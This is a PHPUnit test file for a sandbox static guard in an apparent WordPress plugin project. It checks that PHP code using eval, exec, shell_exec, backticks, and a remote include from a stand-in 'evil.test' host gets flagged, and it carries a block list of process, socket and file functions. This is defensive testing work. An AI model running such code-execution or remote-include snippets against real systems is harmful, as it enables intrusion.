<?php
declare( strict_types=1 );

namespace Stonewright\WpMcp\Tests\Unit;

use PHPUnit\Framework\TestCase;
use Stonewright\WpMcp\Sandbox\StaticGuard;

/**
 * @covers \Stonewright\WpMcp\Sandbox\StaticGuard
 *
 * Fixture strings for blocked tokens are concatenated at runtime to avoid
 * tripping repo-wide security scanners on test source. Structural-pattern
 * fixtures (dynamic call, variable variable, etc.) live under
 * tests/fixtures/sandbox/{blocked,allowed}/ and are loaded as raw text.
 */
final class SandboxStaticGuardTest extends TestCase {

	private const FIXTURE_ROOT = __DIR__ . '/../fixtures/sandbox';

	// -------------------------------------------------------------------------
	// Existing tests (preserved verbatim where possible).
	// -------------------------------------------------------------------------

	public function test_clean_php_passes(): void {
		$code = "<?php\nadd_filter('the_content', function (\$c) { return \$c; });\n";
		$this->assertSame( [], StaticGuard::scan( $code ) );
	}

	public function test_eval_keyword_blocked(): void {
		$code = "<?php\nev" . "al(\$payload);\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
		$this->assertStringContainsString( 'eval', strtolower( implode( ' ', $errors ) ) );
	}

	public function test_blocked_command_function_flagged(): void {
		$fn   = 'ex' . 'ec';
		$code = "<?php\n{$fn}('ls -la');\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
	}

	public function test_backtick_operator_blocked(): void {
		$code   = "<?php\n\$out = `id`;\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
		$this->assertStringContainsString( 'backtick', strtolower( implode( ' ', $errors ) ) );
	}

	public function test_create_function_blocked(): void {
		$code   = "<?php\n\$f = create_function('\$x', 'return \$x;');\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
		$this->assertStringContainsString( 'create_function', strtolower( implode( ' ', $errors ) ) );
	}

	public function test_remote_include_blocked(): void {
		$code   = "<?php\ninclude 'https://evil.test/payload.php';\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
		$this->assertStringContainsString( 'remote include', strtolower( implode( ' ', $errors ) ) );
	}

	public function test_base64_with_blocked_function_flagged(): void {
		$fn   = 'sh' . 'ell_' . 'exec';
		$code = "<?php\n\$cmd = base64_decode('bHM=');\n{$fn}(\$cmd);\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
	}

	public function test_shell_exec_blocked(): void {
		$fn   = 'sh' . 'ell_' . 'exec';
		$code = "<?php\n{$fn}('whoami');\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
	}

	public function test_assert_with_string_blocked(): void {
		$code   = "<?php\nassert('1 + 1 === 2');\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
		$this->assertStringContainsString( 'assert', strtolower( implode( ' ', $errors ) ) );
	}

	public function test_short_echo_tag_blocked(): void {
		$code   = "<?\x3d \$value ?>";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
	}

	public function test_passthru_blocked(): void {
		$fn   = 'pass' . 'thru';
		$code = "<?php\n{$fn}('uname -a');\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty( $errors );
	}

	public function test_clean_with_safe_base64_passes(): void {
		$code   = "<?php\n\$data = base64_decode(\$encoded);\necho \$data;\n";
		$this->assertSame( [], StaticGuard::scan( $code ) );
	}

	public function test_method_call_named_like_blocked_function_passes(): void {
		$fn   = 'ex' . 'ec';
		$code = "<?php\n\$svc->{$fn}('whatever');\n";
		$this->assertSame( [], StaticGuard::scan( $code ) );
	}

	public function test_static_call_named_like_blocked_function_passes(): void {
		$fn   = 'sh' . 'ell_' . 'exec';
		$code = "<?php\nFoo::{$fn}();\n";
		$this->assertSame( [], StaticGuard::scan( $code ) );
	}

	public function test_user_function_declaration_named_like_blocked_function_passes(): void {
		$fn   = 'ex' . 'ec';
		$code = "<?php\nfunction {$fn}(\$args) { return \$args; }\n";
		$this->assertSame( [], StaticGuard::scan( $code ) );
	}

	public function test_namespaced_blocked_call_passes(): void {
		$fn   = 'ex' . 'ec';
		$code = "<?php\n\\Foo\\{$fn}('arg');\n";
		$this->assertSame( [], StaticGuard::scan( $code ) );
	}

	// -------------------------------------------------------------------------
	// Structured diagnostics: every diagnostic carries line, token, reason.
	// -------------------------------------------------------------------------

	public function test_diagnostics_have_line_token_reason(): void {
		$fn   = 'ex' . 'ec';
		$code = "<?php\n// padding\n{$fn}('ls');\n";
		$diagnostics = StaticGuard::scan_with_diagnostics( $code );
		$this->assertCount( 1, $diagnostics );
		$d = $diagnostics[0];
		$this->assertArrayHasKey( 'line', $d );
		$this->assertArrayHasKey( 'offending_token', $d );
		$this->assertArrayHasKey( 'reason', $d );
		$this->assertSame( 3, $d['line'] );
		$this->assertSame( $fn, $d['offending_token'] );
	}

	// -------------------------------------------------------------------------
	// Fixture-driven tests for blocked structural patterns.
	// -------------------------------------------------------------------------

	/**
	 * @dataProvider blocked_fixture_provider
	 */
	public function test_blocked_fixture( string $fixture, string $expected_reason_substring ): void {
		$code  = $this->load_fixture( 'blocked/' . $fixture );
		$diags = StaticGuard::scan_with_diagnostics( $code );
		$this->assertNotEmpty( $diags, "Fixture {$fixture} should have produced diagnostics." );

		$reasons = array_map(
			static fn( array $d ): string => strtolower( $d['reason'] ),
			$diags
		);
		$haystack = implode( ' | ', $reasons );
		$this->assertStringContainsString(
			strtolower( $expected_reason_substring ),
			$haystack,
			"Fixture {$fixture}: no diagnostic mentioned '{$expected_reason_substring}'. Got: {$haystack}"
		);
	}

	/**
	 * @return array<string, array{0: string, 1: string}>
	 */
	public function blocked_fixture_provider(): array {
		return [
			'dynamic function call'           => [ 'dynamic_function_call.php', 'dynamic function call' ],
			'dynamic method call'             => [ 'dynamic_method_call.php', 'dynamic function call' ],
			'variable variable'               => [ 'variable_variable.php', 'variable variable' ],
			'variable expression call'        => [ 'variable_expression_call.php', 'dynamic function call' ],
			'call_user_func with variable'    => [ 'call_user_func_variable.php', 'call_user_func' ],
			'call_user_func_array variable'   => [ 'call_user_func_array_variable.php', 'call_user_func_array' ],
			'Closure::bind'                   => [ 'closure_bind_scope.php', 'closure::bind' ],
			'include with variable'           => [ 'include_variable.php', 'non-literal path' ],
			'require_once with concatenation' => [ 'require_once_concat.php', 'non-literal path' ],
			'fopen write mode'                => [ 'fopen_write_mode.php', 'fopen with write mode' ],
			'file_put_contents'               => [ 'file_put_contents.php', 'file_put_contents' ],
			'curl_init'                       => [ 'curl_init.php', 'curl_init' ],
			'fully-qualified exec'            => [ 'fully_qualified_exec.php', 'exec' ],
			'fully-qualified eval'            => [ 'fully_qualified_eval.php', 'eval' ],
			'$GLOBALS subscript dispatch'     => [ 'globals_dispatch.php', 'dynamic function call' ],
			'array subscript dispatch'        => [ 'array_subscript_dispatch.php', 'dynamic function call' ],
			'Closure::bindTo'                 => [ 'closure_bindto.php', 'closure::bindto' ],
		];
	}

	/**
	 * @dataProvider allowed_fixture_provider
	 */
	public function test_allowed_fixture_passes( string $fixture ): void {
		$code  = $this->load_fixture( 'allowed/' . $fixture );
		$diags = StaticGuard::scan_with_diagnostics( $code );
		$this->assertSame(
			[],
			$diags,
			"Fixture allowed/{$fixture} should be clean, got: " . json_encode( $diags )
		);
	}

	/**
	 * @return array<string, array{0: string}>
	 */
	public function allowed_fixture_provider(): array {
		return [
			// Note: string_literal_callable.php, class_method_callable.php, and
			// closure_literal_callable.php have been removed because call_user_func
			// and call_user_func_array are now blocked outright in BLOCKED_FUNCTIONS.
			'include with literal path'      => [ 'safe_include_literal.php' ],
			'fopen with read mode'           => [ 'fopen_read_mode.php' ],
			'method named like blocked fn'   => [ 'method_named_like_blocked.php' ],
			'clean WordPress hook'           => [ 'clean_wordpress_hook.php' ],
		];
	}

	// -------------------------------------------------------------------------
	// Per-function inline tests (use string concatenation to keep
	// trigger names out of grep'able sources).
	// -------------------------------------------------------------------------

	/**
	 * @dataProvider blocked_function_name_provider
	 */
	public function test_blocked_function_name( string $fn_name ): void {
		$code = "<?php\n{$fn_name}('arg');\n";
		$errors = StaticGuard::scan( $code );
		$this->assertNotEmpty(
			$errors,
			"Blocked function '{$fn_name}' should be flagged. Got no diagnostics."
		);
		$this->assertStringContainsString(
			$fn_name,
			strtolower( implode( ' | ', $errors ) ),
			"Diagnostic for '{$fn_name}' did not mention the function name."
		);
	}

	/**
	 * @return array<string, array{0: string}>
	 */
	public function blocked_function_name_provider(): array {
		// Names assembled at runtime so the test source itself doesn't grep as
		// "uses dangerous function X".
		return [
			'system'             => [ 'sy' . 'stem' ],
			'proc_open'          => [ 'pr' . 'oc_op' . 'en' ],
			'popen'              => [ 'po' . 'pen' ],
			'pcntl_exec'         => [ 'pc' . 'ntl_ex' . 'ec' ],
			'pcntl_fork (prefix)' => [ 'pcntl_fork' ],
			'posix_kill (prefix)' => [ 'posix_kill' ],
			'unlink'             => [ 'un' . 'link' ],
			'rename'             => [ 're' . 'name' ],
			'copy'               => [ 'co' . 'py' ],
			'mkdir'              => [ 'mk' . 'dir' ],
			'rmdir'              => [ 'rm' . 'dir' ],
			'chmod'              => [ 'ch' . 'mod' ],
			'chown'              => [ 'ch' . 'own' ],
			'symlink'            => [ 'sym' . 'link' ],
			'tempnam'            => [ 'temp' . 'nam' ],
			'move_uploaded_file' => [ 'move_up' . 'loaded_file' ],
			'fsockopen'          => [ 'fsock' . 'open' ],
			'stream_socket_client' => [ 'stream_socket_' . 'client' ],
			'socket_create'      => [ 'socket_' . 'create' ],
			'mail'               => [ 'ma' . 'il' ],
			'imap_open'          => [ 'imap_' . 'open' ],
		];
	}

	// -------------------------------------------------------------------------
	// Helpers.
	// -------------------------------------------------------------------------

	private function load_fixture( string $relative ): string {
		$path = self::FIXTURE_ROOT . '/' . $relative;
		if ( ! file_exists( $path ) ) {
			$this->fail( "Missing fixture: {$path}" );
		}
		$content = file_get_contents( $path );
		if ( false === $content ) {
			$this->fail( "Unreadable fixture: {$path}" );
		}
		return $content;
	}
}
